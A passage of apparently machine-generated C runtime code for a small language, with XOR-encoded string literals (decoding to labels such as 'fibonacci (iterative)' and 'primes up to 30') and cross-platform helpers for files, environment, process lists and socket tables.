    return j_rb;
}

static const volatile uint8_t j_enc_99[] = {0x69, 0x6E, 0x63, 0x7C, 0x6A};
static const char* j_dc_99(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_99[j_i] ^ 15;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_100[] = {0xA9, 0xAF, 0xA8, 0xB8};
static const char* j_dc_100(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_100[j_i] ^ 221;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_101[] = {0xEB, 0xEC, 0xE1, 0xFE, 0xE8};
static const char* j_dc_101(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_101[j_i] ^ 141;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_102[] = {0x6E, 0x68, 0x6F, 0x7F};
static const char* j_dc_102(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_102[j_i] ^ 26;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_103[] = {0xD6, 0xD1, 0xDC, 0xC3, 0xD5};
static const char* j_dc_103(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_103[j_i] ^ 176;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_104[] = {0xAF, 0xA9, 0xAE, 0xBE};
static const char* j_dc_104(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_104[j_i] ^ 219;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_105[] = {0xC3, 0xC4, 0xC9, 0xD6, 0xC0};
static const char* j_dc_105(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_105[j_i] ^ 165;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_106[] = {0x5E, 0x58, 0x5F, 0x4F};
static const char* j_dc_106(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_106[j_i] ^ 42;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_107[] = {0xE1, 0xE6, 0xEB, 0xF4, 0xE2};
static const char* j_dc_107(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_107[j_i] ^ 135;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_108[] = {0x0D, 0x0B, 0x0C, 0x1C};
static const char* j_dc_108(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_108[j_i] ^ 121;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_109[] = {0x95, 0x92, 0x9F, 0x80, 0x96};
static const char* j_dc_109(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_109[j_i] ^ 243;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_110[] = {0xD5, 0xD3, 0xD4, 0xC4};
static const char* j_dc_110(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_110[j_i] ^ 161;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_111[] = {0x39, 0x3E, 0x33, 0x2C, 0x3A};
static const char* j_dc_111(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_111[j_i] ^ 95;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_112[] = {0x51, 0x57, 0x50, 0x40};
static const char* j_dc_112(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_112[j_i] ^ 37;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_113[] = {0x01, 0x06, 0x0B, 0x14, 0x02};
static const char* j_dc_113(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_113[j_i] ^ 103;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_114[] = {0x16, 0x10, 0x17, 0x07};
static const char* j_dc_114(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_114[j_i] ^ 98;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_115[] = {0xD6, 0xD1, 0xDC, 0xC3, 0xD5};
static const char* j_dc_115(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_115[j_i] ^ 176;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_116[] = {0xC5, 0xC3, 0xC4, 0xD4};
static const char* j_dc_116(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_116[j_i] ^ 177;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_117[] = {0xA8, 0xAF, 0xA2, 0xBD, 0xAB};
static const char* j_dc_117(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_117[j_i] ^ 206;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_118[] = {0x64, 0x62, 0x65, 0x75};
static const char* j_dc_118(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_118[j_i] ^ 16;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_119[] = {0x11, 0x16, 0x1B, 0x04, 0x12};
static const char* j_dc_119(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_119[j_i] ^ 119;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_120[] = {0xA7, 0xA1, 0xA6, 0xB6};
static const char* j_dc_120(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_120[j_i] ^ 211;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_121[] = {0x30, 0x37, 0x3A, 0x25, 0x33};
static const char* j_dc_121(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_121[j_i] ^ 86;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_122[] = {0x8B, 0x8D, 0x8A, 0x9A};
static const char* j_dc_122(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_122[j_i] ^ 255;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_123[] = {0x0B, 0x0C, 0x01, 0x1E, 0x08};
static const char* j_dc_123(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_123[j_i] ^ 109;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_124[] = {0xAA, 0xAC, 0xAB, 0xBB};
static const char* j_dc_124(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_124[j_i] ^ 222;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_125[] = {0x69, 0x6E, 0x63, 0x7C, 0x6A};
static const char* j_dc_125(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_125[j_i] ^ 15;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_126[] = {0xCB, 0xCD, 0xCA, 0xDA};
static const char* j_dc_126(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_126[j_i] ^ 191;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_127[] = {0x5C, 0x5B, 0x56, 0x49, 0x5F};
static const char* j_dc_127(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_127[j_i] ^ 58;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_128[] = {0xEE, 0xE8, 0xEF, 0xFF};
static const char* j_dc_128(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_128[j_i] ^ 154;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_129[] = {0xE7, 0xE0, 0xED, 0xF2, 0xE4};
static const char* j_dc_129(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_129[j_i] ^ 129;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_130[] = {0x36, 0x30, 0x37, 0x27};
static const char* j_dc_130(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_130[j_i] ^ 66;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_131[] = {0xF7, 0xF0, 0xFD, 0xE2, 0xF4};
static const char* j_dc_131(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_131[j_i] ^ 145;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_132[] = {0x10, 0x16, 0x11, 0x01};
static const char* j_dc_132(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_132[j_i] ^ 100;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_133[] = {0xF5, 0xF2, 0xFF, 0xE0, 0xF6};
static const char* j_dc_133(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_133[j_i] ^ 147;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_134[] = {0x25, 0x25, 0x38, 0x7E, 0x71, 0x7A, 0x77, 0x76, 0x79, 0x7B, 0x7B, 0x71, 0x38, 0x30, 0x71, 0x6C, 0x7D, 0x6A, 0x79, 0x6C, 0x71, 0x6E, 0x7D, 0x31, 0x38, 0x25, 0x25};
static const char* j_dc_134(void) {
    static char j_rb[28];
    for (int j_i = 0; j_i < 27; j_i++) j_rb[j_i] = j_enc_134[j_i] ^ 24;
    j_rb[27] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_135[] = {0xDA, 0xDC, 0xDB, 0xCB};
static const char* j_dc_135(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_135[j_i] ^ 174;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_136[] = {0x28, 0x2F, 0x22, 0x3D, 0x2B};
static const char* j_dc_136(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_136[j_i] ^ 78;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_137[] = {0xFB, 0xFD, 0xFA, 0xEA};
static const char* j_dc_137(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_137[j_i] ^ 143;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_138[] = {0x95, 0x92, 0x9F, 0x80, 0x96};
static const char* j_dc_138(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_138[j_i] ^ 243;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_139[] = {0x00, 0x00, 0x1D, 0x5B, 0x54, 0x5F, 0x52, 0x53, 0x5C, 0x5E, 0x5E, 0x54, 0x1D, 0x15, 0x4F, 0x58, 0x5E, 0x48, 0x4F, 0x4E, 0x54, 0x4B, 0x58, 0x14, 0x1D, 0x00, 0x00};
static const char* j_dc_139(void) {
    static char j_rb[28];
    for (int j_i = 0; j_i < 27; j_i++) j_rb[j_i] = j_enc_139[j_i] ^ 61;
    j_rb[27] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_140[] = {0x9D, 0x9D, 0x80, 0xC6, 0xC1, 0xC3, 0xD4, 0xCF, 0xD2, 0xC9, 0xC1, 0xCC, 0x80, 0x9D, 0x9D};
static const char* j_dc_140(void) {
    static char j_rb[16];
    for (int j_i = 0; j_i < 15; j_i++) j_rb[j_i] = j_enc_140[j_i] ^ 160;
    j_rb[15] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_141[] = {0xBB, 0xBB, 0xA6, 0xE1, 0xF4, 0xE3, 0xE7, 0xF2, 0xE3, 0xF5, 0xF2, 0xA6, 0xE5, 0xE9, 0xEB, 0xEB, 0xE9, 0xE8, 0xA6, 0xE2, 0xEF, 0xF0, 0xEF, 0xF5, 0xE9, 0xF4, 0xA6, 0xBB, 0xBB};
static const char* j_dc_141(void) {
    static char j_rb[30];
    for (int j_i = 0; j_i < 29; j_i++) j_rb[j_i] = j_enc_141[j_i] ^ 134;
    j_rb[29] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_142[] = {0x20, 0x20, 0x3D, 0x6D, 0x6F, 0x74, 0x70, 0x7C, 0x71, 0x74, 0x69, 0x64, 0x3D, 0x20, 0x20};
static const char* j_dc_142(void) {
    static char j_rb[16];
    for (int j_i = 0; j_i < 15; j_i++) j_rb[j_i] = j_enc_142[j_i] ^ 29;
    j_rb[15] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_143[] = {0x91, 0x97, 0x90, 0x80};
static const char* j_dc_143(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_143[j_i] ^ 229;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_144[] = {0xC3, 0xC4, 0xC9, 0xD6, 0xC0};
static const char* j_dc_144(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_144[j_i] ^ 165;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_145[] = {0xD1, 0xD7, 0xD0, 0xC0};
static const char* j_dc_145(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_145[j_i] ^ 165;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_146[] = {0xA7, 0xA0, 0xAD, 0xB2, 0xA4};
static const char* j_dc_146(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_146[j_i] ^ 193;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_147[] = {0x8C, 0x8A, 0x8D, 0x9D};
static const char* j_dc_147(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_147[j_i] ^ 248;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_148[] = {0x9E, 0x99, 0x94, 0x8B, 0x9D};
static const char* j_dc_148(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_148[j_i] ^ 248;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_149[] = {0x81, 0x87, 0x80, 0x90};
static const char* j_dc_149(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_149[j_i] ^ 245;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_150[] = {0x5C, 0x5B, 0x56, 0x49, 0x5F};
static const char* j_dc_150(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_150[j_i] ^ 58;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_151[] = {0x04, 0x04, 0x19, 0x49, 0x4B, 0x50, 0x54, 0x5C, 0x4A, 0x19, 0x4C, 0x49, 0x19, 0x4D, 0x56, 0x19, 0x0A, 0x09, 0x19, 0x04, 0x04};
static const char* j_dc_151(void) {
    static char j_rb[22];
    for (int j_i = 0; j_i < 21; j_i++) j_rb[j_i] = j_enc_151[j_i] ^ 57;
    j_rb[21] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_152[] = {0xD4, 0xD4, 0xC9, 0x8A, 0x86, 0x85, 0x85, 0x88, 0x9D, 0x93, 0xC9, 0x9A, 0x9D, 0x8C, 0x99, 0x9A, 0xC9, 0xD4, 0xD4};
static const char* j_dc_152(void) {
    static char j_rb[20];
    for (int j_i = 0; j_i < 19; j_i++) j_rb[j_i] = j_enc_152[j_i] ^ 233;
    j_rb[19] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_153[] = {0xA6, 0xA6, 0xBB, 0xE8, 0xEE, 0xF6, 0xBB, 0xF4, 0xFD, 0xBB, 0xFF, 0xF2, 0xFC, 0xF2, 0xEF, 0xE8, 0xBB, 0xA6, 0xA6};
static const char* j_dc_153(void) {
    static char j_rb[20];
    for (int j_i = 0; j_i < 19; j_i++) j_rb[j_i] = j_enc_153[j_i] ^ 155;
    j_rb[19] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_154[] = {0x13, 0x13, 0x0E, 0x5C, 0x4B, 0x58, 0x4B, 0x5C, 0x5D, 0x4B, 0x0E, 0x4A, 0x47, 0x49, 0x47, 0x5A, 0x5D, 0x0E, 0x13, 0x13};
static const char* j_dc_154(void) {
    static char j_rb[21];
    for (int j_i = 0; j_i < 20; j_i++) j_rb[j_i] = j_enc_154[j_i] ^ 46;
    j_rb[20] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_155[] = {0x34, 0x34, 0x29, 0x79, 0x66, 0x7E, 0x6C, 0x7B, 0x29, 0x34, 0x34};
static const char* j_dc_155(void) {
    static char j_rb[12];
    for (int j_i = 0; j_i < 11; j_i++) j_rb[j_i] = j_enc_155[j_i] ^ 9;
    j_rb[11] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_156[] = {0x32, 0x32, 0x2F, 0x62, 0x66, 0x61, 0x2F, 0x20, 0x2F, 0x62, 0x6E, 0x77, 0x2F, 0x60, 0x69, 0x2F, 0x7B, 0x67, 0x7D, 0x6A, 0x6A, 0x2F, 0x32, 0x32};
static const char* j_dc_156(void) {
    static char j_rb[25];
    for (int j_i = 0; j_i < 24; j_i++) j_rb[j_i] = j_enc_156[j_i] ^ 15;
    j_rb[24] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_157[] = {0xC9, 0xC9, 0xD4, 0x84, 0x95, 0x98, 0x9D, 0x9A, 0x90, 0x86, 0x9B, 0x99, 0x91, 0xD4, 0x9A, 0x81, 0x99, 0x96, 0x91, 0x86, 0xD4, 0xC9, 0xC9};
static const char* j_dc_157(void) {
    static char j_rb[24];
    for (int j_i = 0; j_i < 23; j_i++) j_rb[j_i] = j_enc_157[j_i] ^ 244;
    j_rb[23] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_158[] = {0x22, 0x24, 0x23, 0x33};
static const char* j_dc_158(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_158[j_i] ^ 86;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_159[] = {0xD3, 0xD4, 0xD9, 0xC6, 0xD0};
static const char* j_dc_159(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_159[j_i] ^ 181;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_160[] = {0xB5, 0xB3, 0xB4, 0xA4};
static const char* j_dc_160(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_160[j_i] ^ 193;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_161[] = {0x74, 0x73, 0x7E, 0x61, 0x77};
static const char* j_dc_161(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_161[j_i] ^ 18;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_162[] = {0x7B, 0x7D, 0x7A, 0x6A};
static const char* j_dc_162(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_162[j_i] ^ 15;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_163[] = {0x96, 0x91, 0x9C, 0x83, 0x95};
static const char* j_dc_163(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_163[j_i] ^ 240;
    j_rb[5] = 0;
    return j_rb;
}

static int32_t j_str_len(const char* s) { return (int32_t)strlen(s); }
static bool j_str_eq(const char* a, const char* b) { return strcmp(a, b) == 0; }

static char j_buf[65536];
#define J_BUF_CAP (sizeof j_buf)

static void j_json_escape(char* out, size_t cap, const char* s) {
    size_t o = 0;
    for (const char* p = s; *p && o + 8 < cap; ++p) {
        unsigned char c = (unsigned char)*p;
        switch (c) {
            case '"': out[o++] = '\\'; out[o++] = '"'; break;
            case '\\': out[o++] = '\\'; out[o++] = '\\'; break;
            case '\n': out[o++] = '\\'; out[o++] = 'n'; break;
            case '\r': out[o++] = '\\'; out[o++] = 'r'; break;
            case '\t': out[o++] = '\\'; out[o++] = 't'; break;
            default:
                if (c < 0x20) {
                    out[o++] = '\\'; out[o++] = 'u'; out[o++] = '0'; out[o++] = '0';
                    out[o++] = j_dc_0()[c >> 4];
                    out[o++] = j_dc_1()[c & 15];
                } else out[o++] = (char)c;
        }
    }
    out[o] = '\0';
}

static const char* j_sys_now(void) {
    time_t t = time(NULL);
#if defined(_WIN32)
    struct tm* tmv = localtime(&t);
    strftime(j_buf, J_BUF_CAP, "%Y-%m-%dT%H:%M:%S", tmv);
#else
    struct tm tmv;
    localtime_r(&t, &tmv);
    strftime(j_buf, J_BUF_CAP, "%Y-%m-%dT%H:%M:%S", &tmv);
#endif
    return j_buf;
}

static void j_sys_sleep(int32_t ms) {
#if defined(_WIN32)
    Sleep((DWORD)ms);
#else
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
#endif
}

static const char* j_sys_cwd(void) {
#if defined(_WIN32)
    _getcwd(j_buf, (int)J_BUF_CAP);
#else
    getcwd(j_buf, J_BUF_CAP);
#endif
    return j_buf;
}

static const char* j_env_get(const char* name) {
    const char* v = getenv(name);
    return v ? v : "";
}

static bool j_fs_exists(const char* path) {
#if defined(_WIN32)
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
#else
    return access(path, F_OK) == 0;
#endif
}

static const char* j_fs_read(const char* path) {
    FILE* f = fopen(path, j_dc_2());
    if (!f) return "";
    size_t n = fread(j_buf, 1, J_BUF_CAP - 1, f);
    fclose(f);
    j_buf[n] = '\0';
    return j_buf;
}

static void j_fs_write(const char* path, const char* data) {
    FILE* f = fopen(path, j_dc_3());
    if (f) { fputs(data, f); fclose(f); }
}

static const char* j_fs_list(const char* dir) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    char pattern[1024];
    snprintf(pattern, sizeof pattern, "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (fd.cFileName[0] == '.') continue;
            if (off > J_BUF_CAP - 200) break;
            if (!first) j_buf[off++] = ',';
            first = 0;
            char esc[1024];
            j_json_escape(esc, sizeof esc, fd.cFileName);
            int n = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n > 0 ? n : 0);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
#else
    DIR* d = opendir(dir);
    if (d) {
        struct dirent* de;
        while ((de = readdir(d)) != NULL) {
            if (de->d_name[0] == '.') continue;
            if (off > J_BUF_CAP - 200) break;
            if (!first) j_buf[off++] = ',';
            first = 0;
            char esc[1024];
            j_json_escape(esc, sizeof esc, de->d_name);
            int n = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n > 0 ? n : 0);
        }
        closedir(d);
    }
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static const char* j_sys_process_list(void) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof pe;
        if (Process32FirstW(snap, &pe)) {
            do {
                if (off > J_BUF_CAP - 400) break;
                char name[1024];
                size_t k = 0;
                for (size_t i = 0; pe.szExeFile[i] && k + 1 < sizeof name; ++i)
                    name[k++] = (char)(pe.szExeFile[i] & 0xFF);
                name[k] = '\0';
                if (!first) j_buf[off++] = ',';
                first = 0;
                char esc[2048];
                j_json_escape(esc, sizeof esc, name);
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%lu,\"name\":\"%s\"}", (unsigned long)pe.th32ProcessID, esc);
                off += (size_t)(n > 0 ? n : 0);
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }
#elif defined(__APPLE__)
    int all_pids[8192];
    int np = proc_listallpids(all_pids, sizeof all_pids);
    for (int i = 0; i < np; ++i) {
        int pid = all_pids[i];
        if (off > J_BUF_CAP - 400) break;
        char name[256];
        int len = proc_name(pid, name, sizeof name);
        if (len <= 0) snprintf(name, sizeof name, "pid_%d", pid);
        if (!first) j_buf[off++] = ',';
        first = 0;
        char esc[512];
        j_json_escape(esc, sizeof esc, name);
        int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%d,\"name\":\"%s\"}", pid, esc);
        off += (size_t)(n > 0 ? n : 0);
    }
#else
    DIR* d = opendir(j_dc_4());
    if (d) {
        struct dirent* de;
        while ((de = readdir(d)) != NULL) {
            if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
            int pid = atoi(de->d_name);
            char p[64], name[256];
            snprintf(p, sizeof p, "/proc/%d/comm", pid);
            FILE* f = fopen(p, j_dc_5());
            if (f) {
                if (fgets(name, sizeof name, f)) name[strcspn(name, j_dc_6())] = '\0';
                fclose(f);
                if (off > J_BUF_CAP - 400) break;
                if (!first) j_buf[off++] = ',';
                first = 0;
                char esc[512];
                j_json_escape(esc, sizeof esc, name);
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%d,\"name\":\"%s\"}", pid, esc);
                off += (size_t)(n > 0 ? n : 0);
            }
        }
        closedir(d);
    }
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static void j_net_proc_parse(const char* path, size_t* off, int* first) {
    FILE* f = fopen(path, j_dc_7());
    if (!f) return;
    char line[512];
    int skip = 1;
    while (fgets(line, sizeof line, f)) {
        if (skip) { skip = 0; continue; }
        char laddr[64], raddr[64], st[16];
        if (sscanf(line, "%*s %63s %63s %15s", laddr, raddr, st) != 3) continue;
        if (*off > J_BUF_CAP - 300) break;
        if (!*first) j_buf[(*off)++] = ',';
        *first = 0;
        int n = snprintf(j_buf + *off, J_BUF_CAP - *off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", laddr, raddr, st);
        *off += (size_t)(n > 0 ? n : 0);
    }
    fclose(f);
}

static const char* j_net_sockets(void) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    ULONG sz = 0;
    GetExtendedTcpTable(NULL, &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    char* t = (char*)malloc(sz ? sz : 1);
    if (t) {
        MIB_TCPTABLE_OWNER_PID* tab = (MIB_TCPTABLE_OWNER_PID*)t;
        if (GetExtendedTcpTable(tab, &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
            for (DWORD i = 0; i < tab->dwNumEntries; ++i) {
                MIB_TCPROW_OWNER_PID* r = &tab->table[i];
                char li[64], ri[64];
                snprintf(li, sizeof li, "%s:%u", inet_ntoa(*(struct in_addr*)&r->dwLocalAddr), (unsigned)ntohs((u_short)r->dwLocalPort));
                snprintf(ri, sizeof ri, "%s:%u", inet_ntoa(*(struct in_addr*)&r->dwRemoteAddr), (unsigned)ntohs((u_short)r->dwRemotePort));
                const char* state = j_dc_8();
                switch (r->dwState) {
                    case 2:  state = j_dc_9(); break;
                    case 5:  state = j_dc_10(); break;
                    case 8:  state = j_dc_11(); break;
                    case 11: state = j_dc_12(); break;
                    default: state = j_dc_13(); break;
                }
                if (off > J_BUF_CAP - 300) break;
                if (!first) j_buf[off++] = ',';
                first = 0;
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", li, ri, state);
                off += (size_t)(n > 0 ? n : 0);
            }
        }
        free(t);
    }
#elif defined(__APPLE__)
    FILE* ns = popen(j_dc_14(), j_dc_15());
    if (ns) {
        char line[512];
        while (fgets(line, sizeof line, ns)) {
            char proto[8], laddr[64], raddr[64], st[32];
            if (sscanf(line, "%7s %*s %*s %63s %63s %31s", proto, laddr, raddr, st) == 4) {
                if (strncmp(proto, j_dc_16(), 3) != 0) continue;
                if (off > J_BUF_CAP - 300) break;
